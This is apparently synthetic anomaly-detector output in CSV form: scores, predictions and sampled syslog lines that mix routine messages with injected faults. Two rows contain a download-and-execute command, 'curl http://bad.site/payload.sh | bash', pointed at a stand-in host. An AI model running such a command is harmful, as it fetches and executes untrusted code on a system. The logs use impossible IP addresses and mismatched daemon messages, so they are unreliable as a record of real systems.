bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 09:38:00,0.9997692351103912,1,1,0.8224995273096307,3,57,telnetd: Rotating log files. || systemd-timesyncd: Finished Daily apt download activities. || ftpd: Accepted publickey for user from 10.0.0.52 port 22 ssh2. || xinetd: Started Session c240 of user root. || unattended-upgrades: Started Cleanup of Temp
2026-07-01 09:39:00,0.999596851720009,1,1,0.8224995273096307,3,61,NetworkManager: Started Session c99 of user root. || smartd: Started CUPS Scheduler. || sshd: Finished Daily apt download activities. || CRON: Rotating log files. || ntpd: Accepted publickey for user from 10.0.0.31 port 22 ssh2. || gpm: Synced RTC ti
2026-07-01 09:40:00,0.9961378407155778,1,1,0.8224995273096307,3,61,unix_chkpwd: Started Session c227 of user root. || gpm: Finished Daily apt download activities. || rsyslogd: Finished Daily apt download activities. || cups: Accepted publickey for user from 10.0.0.246 port 22 ssh2. || cups: Started Session c247 of u
2026-07-01 09:41:00,0.9605784369339512,1,1,0.8224995273096307,3,60,telnetd: Listening on LVM2 poll daemon socket. || smartd: Started CUPS Scheduler. || dockerd: Synced RTC time from system clock. || sudo: Accepted publickey for user from 10.0.0.174 port 22 ssh2. || cups: Accepted publickey for user from 10.0.0.162 p
2026-07-01 09:42:00,0.9965173185964257,1,1,0.8224995273096307,3,59,gpm: Started Cleanup of Temporary Directories. || sshd: Started CUPS Scheduler. || unattended-upgrades: Rotating log files. || chronyd: Listening on LVM2 poll daemon socket. || named: Rotating log files. || named: Started CUPS Scheduler. || unix_chkp
2026-07-01 09:43:00,0.9982345167486506,1,1,0.8224995273096307,3,61,ufw: Started Session c93 of user root. || redis-server: Started Session c105 of user root. || named: Started Cleanup of Temporary Directories. || redis-server: Rotating log files. || ftpd: Started CUPS Scheduler. || CRON: Started CUPS Scheduler. || s
2026-07-01 09:44:00,0.9945597297769807,1,1,0.8224995273096307,3,61,ftpd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || sshd: Accepted publickey for user from 10.0.0.147 port 22 ssh2. || CRON: Started CUPS Scheduler. || gpm: Started Cleanup of Temporary Directories. || gpm: Started Cleanup of Temporary 
2026-07-01 09:45:00,0.9997534595500903,1,1,0.8224995273096307,3,57,sshd: Finished Daily apt download activities. || smartd: Rotating log files. || systemd: Synced RTC time from system clock. || dockerd: Started Session c234 of user root. || telnetd: Rotating log files. || sudo: Started Cleanup of Temporary Directori
2026-07-01 09:46:00,0.99993701021289,1,1,0.8224995273096307,3,59,sshd: Synced RTC time from system clock. || dockerd: Started Cleanup of Temporary Directories. || unattended-upgrades: Synced RTC time from system clock. || ftpd: Started Session c177 of user root. || ftpd: Started Session c35 of user root. || kernel
2026-07-01 09:47:00,0.9999850130395254,1,1,0.8224995273096307,3,63,xinetd: Rotating log files. || cups: Synced RTC time from system clock. || smartd: Started Cleanup of Temporary Directories. || gpm: Finished Daily apt download activities. || sshd: Rotating log files. || smartd: Started Cleanup of Temporary Director
2026-07-01 09:48:00,0.9998839711117132,1,1,0.8224995273096307,3,63,sshd: Started CUPS Scheduler. || gpm: Started Session c55 of user root. || gpm: Synced RTC time from system clock. || smartd: kernel: Kernel panic - not syncing: Fatal exception || kernel: Accepted publickey for user from 10.0.0.77 port 22 ssh2. || s
2026-07-01 09:49:00,0.9999651920763457,1,1,0.8224995273096307,3,61,NetworkManager: Started Session c46 of user root. || smartd: Started Cleanup of Temporary Directories. || telnetd: Started CUPS Scheduler. || dockerd: Started CUPS Scheduler. || gpm: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm l
2026-07-01 09:50:00,0.9999260077207583,1,1,0.8224995273096307,3,61,ftpd: Finished Daily apt download activities. || systemd-timesyncd: Started Session c224 of user root. || rsyslogd: Rotating log files. || unix_chkpwd: Finished Daily apt download activities. || xinetd: Started Cleanup of Temporary Directories. || lo
2026-07-01 09:51:00,0.9999606104656319,1,1,0.8224995273096307,3,61,ntpd: Finished Daily apt download activities. || unix_chkpwd: Started CUPS Scheduler. || telnetd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Started CUPS Scheduler. || ufw: Synced RTC time from system clock. || named: Started Clean
2026-07-01 09:52:00,0.9999136896068144,1,1,0.8224995273096307,3,60,unattended-upgrades: Started Session c182 of user root. || dockerd: Rotating log files. || systemd: Started Cleanup of Temporary Directories. || dockerd: Synced RTC time from system clock. || NetworkManager: Started Cleanup of Temporary Directories. 
2026-07-01 09:53:00,0.9999375891786956,1,1,0.8224995273096307,3,61,NetworkManager: Started Session c47 of user root. || sshd: Started Cleanup of Temporary Directories. || cups: Started Cleanup of Temporary Directories. || named: Synced RTC time from system clock. || unix_chkpwd: Started CUPS Scheduler. || ftpd: Acce
2026-07-01 09:54:00,0.9999601022198523,1,1,0.8224995273096307,3,60,ftpd: Listening on LVM2 poll daemon socket. || sshd: Started Session c195 of user root. || unattended-upgrades: Started Cleanup of Temporary Directories. || sudo: Accepted publickey for user from 10.0.0.155 port 22 ssh2. || telnetd: Synced RTC time f
2026-07-01 09:55:00,0.9998224567251656,1,1,0.8224995273096307,3,64,kernel: kernel: Kernel panic - not syncing: Fatal exception || smartd: Rotating log files. || kernel: Finished Daily apt download activities. || telnetd: Listening on LVM2 poll daemon socket. || sudo: Accepted publickey for user from 10.0.0.153 port 
2026-07-01 09:56:00,0.9999035716923573,1,1,0.8224995273096307,3,61,unattended-upgrades: Started Cleanup of Temporary Directories. || CRON: kernel: Kernel panic - not syncing: Fatal exception || xinetd: Accepted publickey for user from 10.0.0.179 port 22 ssh2. || rsyslogd: Accepted publickey for user from 10.0.0.205 
2026-07-01 09:57:00,0.9998668671454123,1,1,0.8224995273096307,3,59,logrotate: Listening on LVM2 poll daemon socket. || rsyslogd: Accepted publickey for user from 10.0.0.95 port 22 ssh2. || xinetd: Started Cleanup of Temporary Directories. || NetworkManager: Started Cleanup of Temporary Directories. || unix_chkpwd: A
2026-07-01 09:58:00,0.9999469971403452,1,1,0.8224995273096307,3,62,sshd: kernel: Out of memory: Kill process 51481 (python3) score 987 or sacrifice child || CRON: Synced RTC time from system clock. || sudo: Started CUPS Scheduler. || smartd: Synced RTC time from system clock. || ntpd: Synced RTC time from system clo
2026-07-01 09:59:00,0.9995979620181397,1,1,0.8224995273096307,3,60,chronyd: Started Session c208 of user root. || dockerd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || rsyslogd: Finished Daily apt download activities. || ntpd: Accepted publickey for user from 10
2026-07-01 10:00:00,0.9995427675229941,1,1,0.8224995273096307,3,57,telnetd: Started CUPS Scheduler. || kernel: Started Session c219 of user root. || gpm: Rotating log files. || logrotate: Listening on LVM2 poll daemon socket. || dockerd: Synced RTC time from system clock. || docker: app[1234]: segfault at 0 ip 00007
2026-07-01 10:01:00,0.9999890932163104,1,1,0.8224995273096307,3,60,rsyslogd: Started Session c207 of user root. || kernel: Started Session c186 of user root. || xinetd: Accepted publickey for user from 10.0.0.200 port 22 ssh2. || chronyd: Finished Daily apt download activities. || kernel: Synced RTC time from system
2026-07-01 10:02:00,0.999895043390096,1,1,0.8224995273096307,3,61,rsyslogd: Rotating log files. || CRON: Started Session c89 of user root. || rsyslogd: Synced RTC time from system clock. || sshd: Synced RTC time from system clock. || redis-server: Accepted publickey for user from 10.0.0.144 port 22 ssh2. || Network
2026-07-01 10:03:00,0.9997736541562665,1,1,0.8224995273096307,3,57,systemd-timesyncd: Finished Daily apt download activities. || systemd-timesyncd: Accepted publickey for user from 10.0.0.121 port 22 ssh2. || ftpd: Failed password for invalid user test from 192.168.1.47265 port 22 ssh2 || rsyslogd: Started CUPS Sche
2026-07-01 10:04:00,0.9994469442597731,1,1,0.8224995273096307,3,61,unattended-upgrades: Rotating log files. || unix_chkpwd: Accepted publickey for user from 10.0.0.122 port 22 ssh2. || chronyd: Started CUPS Scheduler. || NetworkManager: Started Session c199 of user root. || CRON: Synced RTC time from system clock. |
2026-07-01 10:05:00,0.9999494112763586,1,1,0.8224995273096307,3,61,smartd: Started Session c228 of user root. || CRON: Accepted publickey for user from 10.0.0.247 port 22 ssh2. || logrotate: Listening on LVM2 poll daemon socket. || cups: Listening on LVM2 poll daemon socket. || dockerd: Synced RTC time from system c
2026-07-01 10:06:00,0.9989396633931014,1,1,0.8224995273096307,3,59,telnetd: Finished Daily apt download activities. || CRON: Started CUPS Scheduler. || logrotate: Listening on LVM2 poll daemon socket. || kernel: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.29441 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || NetworkMan
2026-07-01 10:07:00,0.9974086323104776,1,1,0.8224995273096307,3,57,gpm: Listening on LVM2 poll daemon socket. || named: Accepted publickey for user from 10.0.0.136 port 22 ssh2. || rsyslogd: Finished Daily apt download activities. || logrotate: Started Cleanup of Temporary Directories. || unix_chkpwd: Started Cleanu
2026-07-01 10:08:00,0.9985393054405768,1,1,0.8224995273096307,3,62,rsyslogd: Accepted publickey for user from 10.0.0.19 port 22 ssh2. || xinetd: Started Session c55 of user root. || named: Synced RTC time from system clock. || logrotate: Accepted publickey for user from 10.0.0.28 port 22 ssh2. || systemd-timesyncd: 
2026-07-01 10:09:00,0.9972643858720532,1,1,0.8224995273096307,3,60,kernel: Rotating log files. || CRON: Accepted publickey for user from 10.0.0.151 port 22 ssh2. || logrotate: Synced RTC time from system clock. || systemd-timesyncd: Rotating log files. || systemd: Finished Daily apt download activities. || telnetd: 
2026-07-01 10:10:00,0.9937497754589073,1,1,0.8224995273096307,3,63,systemd-timesyncd: Listening on LVM2 poll daemon socket. || NetworkManager: Synced RTC time from system clock. || sshd: Started Session c179 of user root. || rsyslogd: Started Session c143 of user root. || cups: Accepted publickey for user from 10.0.
2026-07-01 10:11:00,0.9916566056009054,1,1,0.8224995273096307,3,58,docker: Started CUPS Scheduler. || named: Started Cleanup of Temporary Directories. || smartd: Started CUPS Scheduler. || smartd: Accepted publickey for user from 10.0.0.144 port 22 ssh2. || gpm: Rotating log files. || ftpd: Started Session c46 of us
2026-07-01 10:12:00,0.9933018077520896,1,1,0.8224995273096307,3,60,systemd-timesyncd: Started Cleanup of Temporary Directories. || named: Started Cleanup of Temporary Directories. || named: Listening on LVM2 poll daemon socket. || NetworkManager: Failed password for invalid user test from 192.168.1.42982 port 22 ssh
2026-07-01 10:13:00,0.9980074296312966,1,1,0.8224995273096307,3,60,redis-server: Rotating log files. || cups: Started Cleanup of Temporary Directories. || xinetd: Finished Daily apt download activities. || redis-server: Listening on LVM2 poll daemon socket. || systemd: Accepted publickey for user from 10.0.0.218 por
2026-07-01 10:14:00,0.9994839907979686,1,1,0.8224995273096307,3,60,telnetd: Rotating log files. || unix_chkpwd: Started Session c88 of user root. || unattended-upgrades: Started Cleanup of Temporary Directories. || logrotate: Accepted publickey for user from 10.0.0.245 port 22 ssh2. || systemd-timesyncd: Synced RTC 
2026-07-01 10:15:00,0.9999354358192489,1,1,0.8224995273096307,3,59,ntpd: Listening on LVM2 poll daemon socket. || CRON: Started Cleanup of Temporary Directories. || systemd-timesyncd: Finished Daily apt download activities. || telnetd: Listening on LVM2 poll daemon socket. || systemd: Started Cleanup of Temporary Di
2026-07-01 10:16:00,0.9999855678937302,1,1,0.8224995273096307,3,61,smartd: Listening on LVM2 poll daemon socket. || kernel: Synced RTC time from system clock. || chronyd: Started CUPS Scheduler. || telnetd: Finished Daily apt download activities. || gpm: Started Session c214 of user root. || unattended-upgrades: Rot
2026-07-01 10:17:00,0.9999688695043314,1,1,0.8224995273096307,3,58,logrotate: Accepted publickey for user from 10.0.0.194 port 22 ssh2. || chronyd: Finished Daily apt download activities. || ufw: Synced RTC time from system clock. || cups: Rotating log files. || ntpd: Finished Daily apt download activities. || Netwo
2026-07-01 10:18:00,0.9966806729020233,1,1,0.8224995273096307,3,61,CRON: Started CUPS Scheduler. || sshd: Accepted publickey for user from 10.0.0.57 port 22 ssh2. || named: Synced RTC time from system clock. || xinetd: Listening on LVM2 poll daemon socket. || redis-server: app[1234]: segfault at 0 ip 00007f stackpoi
2026-07-01 10:19:00,0.998030971098044,1,1,0.8224995273096307,3,60,unattended-upgrades: Accepted publickey for user from 10.0.0.113 port 22 ssh2. || ntpd: Rotating log files. || smartd: Synced RTC time from system clock. || gpm: Rotating log files. || named: Listening on LVM2 poll daemon socket. || xinetd: Started S
2026-07-01 10:20:00,0.9994970992988685,1,1,0.8224995273096307,3,64,rsyslogd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Started Session c140 of user root. || redis-server: Synced RTC time from system clock. || xinetd: Synced RTC time from system clock. || sshd: Listening on LVM2 poll daemon socket
2026-07-01 10:21:00,0.9999756346730756,1,1,0.8224995273096307,3,59,unix_chkpwd: Started Session c18 of user root. || xinetd: Accepted publickey for user from 10.0.0.119 port 22 ssh2. || cups: Started Session c26 of user root. || CRON: Synced RTC time from system clock. || sudo: Synced RTC time from system clock. || 
2026-07-01 10:22:00,0.9999536208549369,1,1,0.8224995273096307,3,58,rsyslogd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || ufw: Synced RTC time from system clock. || smartd: Synced RTC time from system clock. || dockerd: Rotating log files. || ufw: Listening on LVM2 poll daemon socket. || CRON: Started
2026-07-01 10:23:00,0.9996540844544018,1,1,0.8224995273096307,3,58,cups: Finished Daily apt download activities. || unattended-upgrades: Started Cleanup of Temporary Directories. || cups: Rotating log files. || systemd: Listening on LVM2 poll daemon socket. || logrotate: Accepted publickey for user from 10.0.0.225 p
2026-07-01 10:24:00,0.9974483746980634,1,1,0.8224995273096307,3,59,systemd-timesyncd: Synced RTC time from system clock. || unattended-upgrades: Finished Daily apt download activities. || unix_chkpwd: Started Session c144 of user root. || redis-server: Accepted publickey for user from 10.0.0.144 port 22 ssh2. || CRO
2026-07-01 10:25:00,0.9997564888405422,1,1,0.8224995273096307,3,68,chronyd: Finished Daily apt download activities. || sudo: Started Cleanup of Temporary Directories. || named: Rotating log files. || unattended-upgrades: Listening on LVM2 poll daemon socket. || sudo: Rotating log files. || xinetd: Started Cleanup of
2026-07-01 10:26:00,0.9989222896714307,1,1,0.8224995273096307,3,56,kernel: Accepted publickey for user from 10.0.0.41 port 22 ssh2. || systemd: Started Cleanup of Temporary Directories. || cups: Accepted publickey for user from 10.0.0.168 port 22 ssh2. || systemd: Started Session c198 of user root. || ntpd: Started 
2026-07-01 10:27:00,0.920592860447723,1,1,0.8224995273096307,3,58,logrotate: Started Cleanup of Temporary Directories. || chronyd: Finished Daily apt download activities. || ntpd: Started Cleanup of Temporary Directories. || gpm: Started Session c191 of user root. || docker: Started CUPS Scheduler. || sshd: Listeni
2026-07-01 10:28:00,0.9944454082476267,1,1,0.8224995273096307,3,57,ufw: Finished Daily apt download activities. || xinetd: Started Session c157 of user root. || smartd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || kernel: kernel: Out of memory: Kill process 3477
2026-07-01 10:29:00,0.998443696986509,1,1,0.8224995273096307,3,60,telnetd: Started CUPS Scheduler. || rsyslogd: Listening on LVM2 poll daemon socket. || NetworkManager: Started Session c96 of user root. || unattended-upgrades: Started CUPS Scheduler. || rsyslogd: Started CUPS Scheduler. || cups: Synced RTC time fro
2026-07-01 10:30:00,0.9995142350831425,1,1,0.8224995273096307,3,61,docker: Started Cleanup of Temporary Directories. || logrotate: Started CUPS Scheduler. || docker: Synced RTC time from system clock. || kernel: Accepted publickey for user from 10.0.0.192 port 22 ssh2. || ufw: Started CUPS Scheduler. || ntpd: kernel
2026-07-01 10:31:00,0.9994152174935776,1,1,0.8224995273096307,3,66,sudo: Listening on LVM2 poll daemon socket. || systemd: Started Session c46 of user root. || docker: Started Cleanup of Temporary Directories. || rsyslogd: Listening on LVM2 poll daemon socket. || ftpd: Started Cleanup of Temporary Directories. || lo
2026-07-01 10:32:00,0.9993263857877415,1,1,0.8224995273096307,3,60,ftpd: Accepted publickey for user from 10.0.0.220 port 22 ssh2. || dockerd: Accepted publickey for user from 10.0.0.128 port 22 ssh2. || cups: Rotating log files. || CRON: Synced RTC time from system clock. || telnetd: Started Cleanup of Temporary Di
2026-07-01 10:33:00,0.9998116199045465,1,1,0.8224995273096307,3,58,gpm: Started Cleanup of Temporary Directories. || cups: Rotating log files. || named: Started Session c195 of user root. || NetworkManager: Started CUPS Scheduler. || NetworkManager: Started CUPS Scheduler. || logrotate: Accepted publickey for user f
2026-07-01 10:34:00,0.999968089140017,1,1,0.8224995273096307,3,58,sudo: Accepted publickey for user from 10.0.0.100 port 22 ssh2. || unattended-upgrades: Started Cleanup of Temporary Directories. || sshd: Listening on LVM2 poll daemon socket. || kernel: Started Session c88 of user root. || smartd: Finished Daily ap
2026-07-01 10:35:00,0.9999611333680596,1,1,0.8224995273096307,3,61,systemd-timesyncd: Finished Daily apt download activities. || smartd: Accepted publickey for user from 10.0.0.116 port 22 ssh2. || dockerd: Rotating log files. || named: Synced RTC time from system clock. || ufw: Rotating log files. || docker: Listen
2026-07-01 10:36:00,0.9999838364065746,1,1,0.8224995273096307,3,60,ntpd: Listening on LVM2 poll daemon socket. || sshd: Accepted publickey for user from 10.0.0.222 port 22 ssh2. || ntpd: Accepted publickey for user from 10.0.0.86 port 22 ssh2. || sshd: Started Cleanup of Temporary Directories. || NetworkManager: Rot
2026-07-01 10:37:00,0.9999846830244278,1,1,0.8224995273096307,3,63,smartd: Rotating log files. || unix_chkpwd: Started Session c43 of user root. || telnetd: Started Session c148 of user root. || rsyslogd: Listening on LVM2 poll daemon socket. || kernel: Started Cleanup of Temporary Directories. || named: Synced RTC 
2026-07-01 10:38:00,0.999834508639244,1,1,0.8224995273096307,3,62,systemd-timesyncd: Started Cleanup of Temporary Directories. || smartd: Synced RTC time from system clock. || named: Started CUPS Scheduler. || chronyd: Accepted publickey for user from 10.0.0.30 port 22 ssh2. || telnetd: Synced RTC time from system 
2026-07-01 10:39:00,0.99973232187917,1,1,0.8224995273096307,3,66,CRON: Synced RTC time from system clock. || unix_chkpwd: Started CUPS Scheduler. || unattended-upgrades: Listening on LVM2 poll daemon socket. || NetworkManager: Accepted publickey for user from 10.0.0.123 port 22 ssh2. || NetworkManager: Rotating lo
2026-07-01 10:40:00,0.9999057483472349,1,1,0.8224995273096307,3,56,logrotate: Started CUPS Scheduler. || systemd-timesyncd: Started Session c69 of user root. || NetworkManager: Started Session c223 of user root. || dockerd: Started Cleanup of Temporary Directories. || ntpd: Started CUPS Scheduler. || unix_chkpwd: Ac
2026-07-01 10:41:00,0.9988398535288928,1,1,0.8224995273096307,3,59,dockerd: Accepted publickey for user from 10.0.0.142 port 22 ssh2. || docker: Accepted publickey for user from 10.0.0.149 port 22 ssh2. || redis-server: Synced RTC time from system clock. || gpm: Started CUPS Scheduler. || logrotate: Listening on LVM
2026-07-01 10:42:00,0.9967018380305489,1,1,0.8224995273096307,3,62,CRON: Synced RTC time from system clock. || unix_chkpwd: Rotating log files. || chronyd: Accepted publickey for user from 10.0.0.167 port 22 ssh2. || telnetd: Rotating log files. || gpm: Synced RTC time from system clock. || smartd: Started CUPS Sche
2026-07-01 10:43:00,0.9963961908295879,1,1,0.8224995273096307,3,60,logrotate: Synced RTC time from system clock. || systemd: Started Cleanup of Temporary Directories. || logrotate: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.12674 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || rsyslogd: Started Session c40 of user roo
2026-07-01 10:44:00,0.9999056286695894,1,1,0.8224995273096307,3,57,NetworkManager: Accepted publickey for user from 10.0.0.200 port 22 ssh2. || dockerd: Synced RTC time from system clock. || ntpd: Started CUPS Scheduler. || chronyd: Finished Daily apt download activities. || systemd: Started Session c112 of user roo
2026-07-01 10:45:00,0.9997880390223862,1,1,0.8224995273096307,3,60,rsyslogd: Rotating log files. || xinetd: Started Session c161 of user root. || unix_chkpwd: Listening on LVM2 poll daemon socket. || telnetd: Started Cleanup of Temporary Directories. || systemd: Accepted publickey for user from 10.0.0.175 port 22 ss
2026-07-01 10:46:00,0.9998302889624967,1,1,0.8224995273096307,3,61,CRON: Accepted publickey for user from 10.0.0.49 port 22 ssh2. || ufw: Listening on LVM2 poll daemon socket. || NetworkManager: Started Session c217 of user root. || systemd: Accepted publickey for user from 10.0.0.152 port 22 ssh2. || named: Listeni
2026-07-01 10:47:00,0.9998423834756693,1,1,0.8224995273096307,3,62,sudo: Synced RTC time from system clock. || docker: Started CUPS Scheduler. || logrotate: kernel: Kernel panic - not syncing: Fatal exception || smartd: Accepted publickey for user from 10.0.0.131 port 22 ssh2. || docker: Rotating log files. || redis
2026-07-01 10:48:00,0.9998251513738746,1,1,0.8224995273096307,3,61,docker: Finished Daily apt download activities. || gpm: Rotating log files. || unattended-upgrades: Listening on LVM2 poll daemon socket. || ntpd: kernel: Out of memory: Kill process 54513 (python3) score 987 or sacrifice child || xinetd: Accepted pu
2026-07-01 10:49:00,0.999936223687398,1,1,0.8224995273096307,3,61,systemd: Finished Daily apt download activities. || sshd: Started CUPS Scheduler. || systemd: Synced RTC time from system clock. || telnetd: Listening on LVM2 poll daemon socket. || ufw: Synced RTC time from system clock. || named: Synced RTC time fr
2026-07-01 10:50:00,0.999953883699035,1,1,0.8224995273096307,3,62,sudo: Started Cleanup of Temporary Directories. || ntpd: Failed password for invalid user test from 192.168.1.49507 port 22 ssh2 || unix_chkpwd: Started Cleanup of Temporary Directories. || xinetd: Synced RTC time from system clock. || logrotate: Sta
2026-07-01 10:51:00,0.9997892609010417,1,1,0.8224995273096307,3,59,ufw: Started Cleanup of Temporary Directories. || xinetd: Accepted publickey for user from 10.0.0.17 port 22 ssh2. || smartd: Started CUPS Scheduler. || logrotate: Finished Daily apt download activities. || cups: Finished Daily apt download activitie
2026-07-01 10:52:00,0.9998767768170901,1,1,0.8224995273096307,3,60,rsyslogd: Finished Daily apt download activities. || kernel: Synced RTC time from system clock. || named: Listening on LVM2 poll daemon socket. || sshd: Synced RTC time from system clock. || redis-server: Started CUPS Scheduler. || sudo: Started Sess
2026-07-01 10:53:00,0.999989548257728,1,1,0.8224995273096307,3,61,cups: Listening on LVM2 poll daemon socket. || CRON: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started Session c18 of user root. || ufw: Accepted publickey for user from 10.0.0.64 port 22 ssh2. || sshd: Started CUPS Scheduler. || redis-se
2026-07-01 10:54:00,0.9994600324179428,1,1,0.8224995273096307,3,59,systemd-timesyncd: Finished Daily apt download activities. || sshd: Started CUPS Scheduler. || telnetd: kernel: Out of memory: Kill process 27492 (python3) score 987 or sacrifice child || rsyslogd: Listening on LVM2 poll daemon socket. || redis-serve
2026-07-01 10:55:00,0.9957713811041357,1,1,0.8224995273096307,3,59,named: Accepted publickey for user from 10.0.0.142 port 22 ssh2. || kernel: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || chronyd: Started Cleanup of Temporary Directories. || ftpd: Rotating log files. || u
2026-07-01 10:56:00,0.9980639234446222,1,1,0.8224995273096307,3,61,unix_chkpwd: Started CUPS Scheduler. || rsyslogd: Rotating log files. || gpm: Started Cleanup of Temporary Directories. || systemd: kernel: Out of memory: Kill process 48416 (python3) score 987 or sacrifice child || ftpd: Started CUPS Scheduler. || g
2026-07-01 10:57:00,0.9991208763632521,1,1,0.8224995273096307,3,64,rsyslogd: Rotating log files. || systemd: Synced RTC time from system clock. || rsyslogd: Started Session c219 of user root. || telnetd: Accepted publickey for user from 10.0.0.84 port 22 ssh2. || kernel: Started Session c109 of user root. || logrota
2026-07-01 10:58:00,0.9998185959046442,1,1,0.8224995273096307,3,59,logrotate: Started Cleanup of Temporary Directories. || chronyd: Listening on LVM2 poll daemon socket. || sshd: Started Session c156 of user root. || unix_chkpwd: Rotating log files. || ftpd: Synced RTC time from system clock. || logrotate: Started C
2026-07-01 10:59:00,0.9970858325902339,1,1,0.8224995273096307,3,60,NetworkManager: Started Cleanup of Temporary Directories. || systemd: Listening on LVM2 poll daemon socket. || cups: Started Session c105 of user root. || rsyslogd: Rotating log files. || kernel: Accepted publickey for user from 10.0.0.175 port 22 ss
2026-07-01 11:00:00,0.9969706447968021,1,1,0.8224995273096307,3,58,CRON: Rotating log files. || logrotate: Finished Daily apt download activities. || sshd: Started Cleanup of Temporary Directories. || NetworkManager: Listening on LVM2 poll daemon socket. || rsyslogd: Synced RTC time from system clock. || logrotate: 
2026-07-01 11:01:00,0.9997241574039739,1,1,0.8224995273096307,3,60,kernel: Started CUPS Scheduler. || sudo: Accepted publickey for user from 10.0.0.206 port 22 ssh2. || docker: Started Cleanup of Temporary Directories. || unix_chkpwd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started Session c104 o
2026-07-01 11:02:00,0.996183898098674,1,1,0.8224995273096307,3,62,docker: Started Session c127 of user root. || rsyslogd: Rotating log files. || NetworkManager: Started CUPS Scheduler. || smartd: Synced RTC time from system clock. || ftpd: Started Cleanup of Temporary Directories. || smartd: Started Session c46 of 
2026-07-01 11:03:00,0.9983375409926588,1,1,0.8224995273096307,3,56,ftpd: Listening on LVM2 poll daemon socket. || CRON: Accepted publickey for user from 10.0.0.242 port 22 ssh2. || smartd: Rotating log files. || sshd: Accepted publickey for user from 10.0.0.10 port 22 ssh2. || CRON: Started Cleanup of Temporary Dire
2026-07-01 11:04:00,0.9960817120301803,1,1,0.8224995273096307,3,64,kernel: Started CUPS Scheduler. || smartd: Started Session c231 of user root. || systemd: Rotating log files. || docker: Finished Daily apt download activities. || CRON: Rotating log files. || NetworkManager: Listening on LVM2 poll daemon socket. || 
2026-07-01 11:05:00,0.9974665838093796,1,1,0.8224995273096307,3,59,rsyslogd: Started Cleanup of Temporary Directories. || ftpd: Synced RTC time from system clock. || ufw: Started CUPS Scheduler. || systemd-timesyncd: Finished Daily apt download activities. || ufw: Accepted publickey for user from 10.0.0.64 port 22 s
2026-07-01 11:06:00,0.9997359390716177,1,1,0.8224995273096307,3,55,named: Started Cleanup of Temporary Directories. || ufw: Finished Daily apt download activities. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Finished Daily apt download activities. || CRON: Synced RTC time from
2026-07-01 11:07:00,0.9999454782663064,1,1,0.8224995273096307,3,62,rsyslogd: Rotating log files. || unattended-upgrades: Started Cleanup of Temporary Directories. || gpm: Synced RTC time from system clock. || cups: Finished Daily apt download activities. || systemd: Started Cleanup of Temporary Directories. || syste
2026-07-01 11:08:00,0.9999037755072009,1,1,0.8224995273096307,3,60,ftpd: Started Session c99 of user root. || rsyslogd: Started Cleanup of Temporary Directories. || sshd: Accepted publickey for user from 10.0.0.13 port 22 ssh2. || ufw: Accepted publickey for user from 10.0.0.165 port 22 ssh2. || ufw: Started Cleanup
2026-07-01 11:09:00,0.9998679583128336,1,1,0.8224995273096307,3,64,named: Started CUPS Scheduler. || chronyd: kernel: Kernel panic - not syncing: Fatal exception || CRON: Started Session c11 of user root. || systemd-timesyncd: Started Cleanup of Temporary Directories. || sshd: Synced RTC time from system clock. || u
2026-07-01 11:10:00,0.9998536080217333,1,1,0.8224995273096307,3,59,redis-server: Started CUPS Scheduler. || NetworkManager: Started Cleanup of Temporary Directories. || ufw: Accepted publickey for user from 10.0.0.5 port 22 ssh2. || rsyslogd: Started Session c138 of user root. || unix_chkpwd: Synced RTC time from sy
2026-07-01 11:11:00,0.9998707502696235,1,1,0.8224995273096307,3,59,logrotate: Accepted publickey for user from 10.0.0.88 port 22 ssh2. || unattended-upgrades: Finished Daily apt download activities. || docker: Listening on LVM2 poll daemon socket. || CRON: Rotating log files. || telnetd: Listening on LVM2 poll daemo
